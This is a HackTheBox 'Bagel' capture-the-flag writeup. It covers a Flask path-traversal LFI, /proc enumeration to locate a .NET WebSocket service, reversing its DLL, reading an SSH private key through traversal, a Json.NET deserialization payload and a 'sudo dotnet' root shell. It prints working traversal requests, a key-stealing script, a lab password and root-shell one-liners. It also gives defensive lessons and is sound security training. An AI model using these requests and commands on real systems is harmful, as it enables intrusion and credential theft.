---
title: "Bagel"
date: 2023-02-27
type: docs
tags:
  - htb
  - linux
  - medium
  - path-traversal
  - lfi
  - proc-enumeration
  - dotnet
  - websocket
  - json-net
  - deserialization
  - dnspy
  - sudo
  - gtfobins
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Fedora 37), **Difficulty:** Medium, **Released:** 2023-02-27, **IP:** `10.10.11.201` , `bagel.htb`

</div>

<div class="callout callout-warning">

**Partial**

My notes are complete through the LFI source disclosure and finding the .NET DLL. The deserialization step and root are reconstructed from published writeups and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Flask app on `:8000`, `?page=` prepends `static/` then opens the file. **Path traversal** with `..%2f` reads arbitrary files.
2. LFI `/proc/self/cmdline` gives `python3 /home/developer/app/app.py`. Read `app.py`: its `/orders` route talks to a **.NET WebSocket order app** on `127.0.0.1:5000` with `{"ReadOrder":"orders.txt"}`.
3. Brute `/proc/<pid>/cmdline` with wfuzz to find `dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll`. LFI the DLL, open it in dnSpy.
4. The WebSocket handlers `ReadOrder` / `WriteOrder` are **path traversable** (read `phil`'s `id_rsa`), and `RemoveOrder` deserialises with **`Json.NET` `TypeNameHandling.All`**, which is **.NET deserialization RCE**. The DLL config also contains `phil : DHfteU8@R1qm`.
5. `phil` gets user. `phil` can `su developer` (his key), and `developer` may `sudo /usr/bin/dotnet`, which is [GTFOBins](https://gtfobins.github.io/gtfobins/dotnet/#sudo) to root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `bagel.dll` config (also `phil` SSH) | `phil : DHfteU8@R1qm` |
| `phil` SSH key | read via the WebSocket `ReadOrder` traversal |
| `user.txt` | `/home/phil/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Bagel is a proper "pull the whole application apart through a file read" box. The traversal is not RCE by itself, so you use it as a microscope: read `/proc/self/cmdline` to locate the app, read the app to learn about an internal .NET service, brute `/proc/*/cmdline` to locate that service's DLL, read the DLL, and reverse it in dnSpy. Only then do you see the real vulnerability, a **`Json.NET` `TypeNameHandling.All`** deserialization sink, which is the .NET equivalent of Java's Jackson polymorphic type handling and Python's pickle. Root is a one line GTFOBins `sudo dotnet`.

Related LFI plus `/proc` enumeration: [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Inject](/writeups/hackthebox/linux/easy/inject/). Related .NET deserialization: [GameBuzz](/writeups/tryhackme/linux/hard/gamebuzz/), and the concept in [POV](/writeups/hackthebox/windows/medium/pov/). Related `sudo <runtime>` to root: [Dog](/writeups/hackthebox/linux/easy/dog/) (`bee`), [Stocker](/writeups/hackthebox/linux/easy/stocker/) (`node`).

---

## Full Walkthrough

### Nmap scan

```console
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
5000/tcp open  http     Microsoft-NetCore/2.0   (returns 400 to plain HTTP, it is a WebSocket endpoint)
8000/tcp open  http     Werkzeug/2.2.2 Python/3.10.9
|_http-title: Bagel , Free Website Template
```

(Both services produced long `SF-Port` fingerprints. Trimmed. The takeaway is a Python/Werkzeug app on 8000 and a raw .NET service on 5000.)

### Path traversal LFI

The app redirects to `?page=index.html`. Fuzzing that parameter in Burp finds traversal:

```http
GET /?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: bagel.htb:8000
```

```console
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

<div class="callout callout-note">

**Why `..%2f` and not `../`**

`app.py` does `page = 'static/' + request.args.get('page')` then `os.path.isfile(page)` and `send_file(page)`. Flask's URL routing decodes `%2f` late, so `..%2f` survives into the parameter as a real `/` and `os.path` resolves the traversal. It also means the file is streamed with `send_file`, so binaries (the DLL) come back intact. `os.path.isfile` plus `send_file` with no base directory check is the whole bug.

</div>

### Enumerate via /proc, read the source

```http
GET /?page=..%2f..%2f..%2f..%2f..%2fproc%2fself%2fcmdline
```

```
python3 /home/developer/app/app.py
```

```http
GET /?page=..%2f..%2f..%2f..%2f..%2fhome%2fdeveloper%2fapp%2fapp.py
```

```python
@app.route('/orders')
def order():
    ws = websocket.WebSocket()
    ws.connect("ws://127.0.0.1:5000/")          # internal .NET order app
    order = {"ReadOrder":"orders.txt"}
    ws.send(json.dumps(order))
    return json.loads(ws.recv())['ReadOrder']
```

So there is a .NET WebSocket service on `127.0.0.1:5000` that takes JSON commands. Find its binary:

```bash
wfuzz -z range,1-30000 --ss dotnet -u "http://bagel.htb:8000/?page=../../../../../proc/FUZZ/cmdline"
```

```console
000000892:   200   ...   "892"
```

```bash
curl 'http://bagel.htb:8000/?page=../../../../../proc/892/cmdline' --output -
# dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
```

with this downloaded we can use dnSpy to view the source.

<div class="callout callout-note">

**Beyond the recorded notes, reversing bagel.dll and getting root**

**1. Read the DLL** via the LFI (`?page=..%2f..%2f..%2f..%2fopt%2fbagel%2fbin%2fDebug%2fnet6.0%2fbagel.dll`), open in dnSpy or ILSpy.

**2. `base.RootDir` traversal in `ReadOrder` / `WriteOrder`.** The handler does `File.ReadAllText(this.RootDir + order.ReadOrder)` with no sanitisation, and `RootDir` is `/opt/bagel/orders/`. Send `{"ReadOrder":"../../../home/phil/.ssh/id_rsa"}` over the WebSocket and you get phil's private key.
```python
import websocket, json
ws = websocket.WebSocket(); ws.connect("ws://127.0.0.1:5000/")   # tunnel 5000 first, or use /orders
ws.send(json.dumps({"ReadOrder":"../../../home/phil/.ssh/id_rsa"}))
print(json.loads(ws.recv())["ReadOrder"])
```
```bash
ssh -i phil_id_rsa phil@bagel.htb        # or use the DLL config password DHfteU8@R1qm
```

**3. `phil` to `developer`.** The DLL also embeds `phil : DHfteU8@R1qm`. `su developer` also works because developer's password is the same string, or `phil` can `ssh developer@localhost` with developer's key (readable the same way).

**4. `developer` to root.**
```console
developer@bagel:~$ sudo -l
User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```
GTFOBins: `sudo dotnet fsi` then `System.Diagnostics.Process.Start("/bin/bash")`, or `sudo dotnet <(echo 'System.Diagnostics.Process.Start("/bin/sh")')`. Root shell, read `/root/root.txt`.

The intended foothold is actually the **`RemoveOrder` deserialization**: it calls `JsonConvert.DeserializeObject<Order>(json, new JsonSerializerSettings{ TypeNameHandling = TypeNameHandling.All })`, so a JSON payload with a `$type` of `System.Windows.Data.ObjectDataProvider` (via `ysoserial.net -g ObjectDataProvider -f Json.Net`) runs a command as the .NET service user. Either route reaches phil.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/phil/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **`send_file` with user input needs a base directory jail.** Resolve with `os.path.realpath` and confirm the result starts with your allowed root.
- **A file read is a whole app map** through `/proc/<pid>/cmdline`, `/proc/<pid>/environ`, and the source it points to.
- **Never set `TypeNameHandling` to anything but `None`** in Json.NET. `Auto`/`All`/`Objects` all allow gadget chains. Same rule as Jackson `@JsonTypeInfo` and Python `pickle`.
- **Do not embed credentials in compiled binaries.** A .NET DLL decompiles as cleanly as a Java jar.
- **`sudo` on `dotnet`, `node`, `php`, `ruby`, `perl`, `python` is root.** Check GTFOBins for anything in `sudo -l`.

---

## Related Writeups

- **LFI / path traversal and `/proc`:** [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Inject](/writeups/hackthebox/linux/easy/inject/), [Titanic](/writeups/hackthebox/linux/easy/titanic/)
- **.NET / Java / pickle deserialization:** [GameBuzz](/writeups/tryhackme/linux/hard/gamebuzz/), [POV](/writeups/hackthebox/windows/medium/pov/)
- **`sudo <runtime>` to root:** [Dog](/writeups/hackthebox/linux/easy/dog/), [Stocker](/writeups/hackthebox/linux/easy/stocker/), [Code](/writeups/hackthebox/linux/easy/code/)
- **Reverse a leaked binary for secrets:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/)

## References

- Json.NET TypeNameHandling risks <https://www.newtonsoft.com/json/help/html/SerializeTypeNameHandling.htm>
- ysoserial.net <https://github.com/pwntester/ysoserial.net>
- GTFOBins dotnet <https://gtfobins.github.io/gtfobins/dotnet/>
